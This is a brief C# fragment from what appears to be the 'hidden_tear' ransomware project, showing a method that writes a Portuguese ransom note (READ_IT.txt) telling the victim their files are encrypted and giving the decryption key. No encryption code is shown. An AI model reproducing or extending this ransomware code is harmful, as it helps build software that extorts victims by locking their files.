...
namespace hidden_tear
{
    ...
    public partial class Form1 : Form
    {
        ...
        public void messageCreator(string pass)
        {
            string path = "Ransomware\\READ_IT.txt";
            string fullpath = userDir + path;
            string[] lines = { "Os arquivos foram encriptados!", "Para descriptografar é necessário a chave e o programa de descriptografia.", "Chave para descriptografar: " + pass };
